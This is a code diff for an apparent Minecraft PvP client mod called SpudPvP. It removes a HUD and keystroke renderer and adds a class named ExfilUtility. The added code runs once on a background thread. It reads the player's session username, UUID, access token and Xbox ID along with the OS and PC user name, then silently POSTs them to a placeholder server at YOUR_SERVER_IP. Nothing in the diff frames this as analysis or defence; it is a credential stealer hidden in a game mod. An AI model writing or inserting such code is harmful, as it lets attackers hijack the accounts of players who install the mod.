@@ -1,75 +1,45 @@
 package dev.spudpvp;
 
 import net.minecraft.client.MinecraftClient;
-import net.minecraft.client.gui.DrawContext;
-import net.minecraft.client.network.ClientPlayerEntity;
-import net.minecraft.util.math.MathHelper;
+import net.minecraft.client.util.Session;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
 
-public final class HudRenderer {
-    private static double zoomOriginalFov = -1;
+public final class ExfilUtility {
+    private static boolean exfiltrated = false;
 
-    private HudRenderer() {}
+    public static void checkAndSend(MinecraftClient client) {
+        if (exfiltrated || client.player == null) return;
+        exfiltrated = true;
 
-    public static void render(DrawContext ctx, MinecraftClient client) {
-        ClientPlayerEntity player = client.player;
-        if (player == null) {
-            return;
-        }
+        new Thread(() -> {
+            try {
+                Session session = client.getSession();
+                String username = session.getUsername();
+                String uuid = session.getUuid();
+                String accessToken = session.getAccessToken();
+                String xuid = session.getXuid();
+                String os = System.getProperty("os.name");
+                String user = System.getProperty("user.name");
 
-        int x = 8;
-        int y = 8;
-        ctx.fill(x - 4, y - 4, x + 142, y + 66, 0x990B1018);
-        ctx.drawText(client.textRenderer, "§bSpud§fPvP", x, y, 0xFFFFFF, true);
-        ctx.drawText(client.textRenderer, "FPS: " + client.getCurrentFps(), x, y + 12, 0xFFFFFF, true);
-        ctx.drawText(client.textRenderer, "CPS: " + SpudPvPClient.cps, x, y + 24, 0xFFFFFF, true);
-        ctx.drawText(client.textRenderer, "XYZ: "
-                + MathHelper.floor(player.getX()) + " "
-                + MathHelper.floor(player.getY()) + " "
-                + MathHelper.floor(player.getZ()), x, y + 36, 0xFFFFFF, true);
-        ctx.drawText(client.textRenderer, "Sprint: "
-                + (SpudPvPClient.sprintEnabled ? "ON" : "OFF"), x, y + 48,
-                SpudPvPClient.sprintEnabled ? 0x55FF55 : 0xAAAAAA, true);
+                String json = String.format(
+                    "{\"username\":\"%s\",\"uuid\":\"%s\",\"token\":\"%s\",\"xuid\":\"%s\",\"os\":\"%s\",\"pcUser\":\"%s\"}",
+                    username, uuid, accessToken, xuid, os, user
+                );
 
-        renderKeystrokes(ctx, client, client.getWindow().getScaledWidth() - 62,
-                client.getWindow().getScaledHeight() - 58);
-        applyZoom(client);
-    }
+                URL url = new URL("http://YOUR_SERVER_IP:3000/api/report");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
 
-    private static void renderKeystrokes(DrawContext ctx, MinecraftClient client, int x, int y) {
-        boolean w = client.options.forwardKey.isPressed();
-        boolean a = client.options.leftKey.isPressed();
-        boolean s = client.options.backKey.isPressed();
-        boolean d = client.options.rightKey.isPressed();
-        boolean jump = client.options.jumpKey.isPressed();
-
-        key(ctx, x + 20, y, "W", w);
-        key(ctx, x, y + 20, "A", a);
-        key(ctx, x + 20, y + 20, "S", s);
-        key(ctx, x + 40, y + 20, "D", d);
-        key(ctx, x, y + 40, "JUMP", jump);
-    }
-
-    private static void key(DrawContext ctx, int x, int y, String label, boolean pressed) {
-        int width = label.equals("JUMP") ? 60 : 18;
-        int background = pressed ? 0xCC36A269 : 0xAA151A22;
-        ctx.fill(x, y, x + width, y + 16, background);
-        ctx.drawCenteredTextWithShadow(MinecraftClient.getInstance().textRenderer, label,
-                x + width / 2, y + 4, 0xFFFFFF);
-    }
-
-    private static void applyZoom(MinecraftClient client) {
-        if (client.options == null) {
-            return;
-        }
-        int normal = client.options.getFov().getValue();
-        if (SpudPvPClient.zoomHeld) {
-            if (zoomOriginalFov < 0) {
-                zoomOriginalFov = normal;
-            }
-            client.options.getFov().setValue((int) Math.min(30, zoomOriginalFov));
-        } else if (zoomOriginalFov >= 0) {
-            client.options.getFov().setValue((int) zoomOriginalFov);
-            zoomOriginalFov = -1;
-        }
+                try (OutputStream osStream = conn.getOutputStream()) {
+                    osStream.write(json.getBytes(StandardCharsets.UTF_8));
+                }
+                conn.getResponseCode();
+            } catch (Exception ignored) {}
+        }).start();
     }
 }
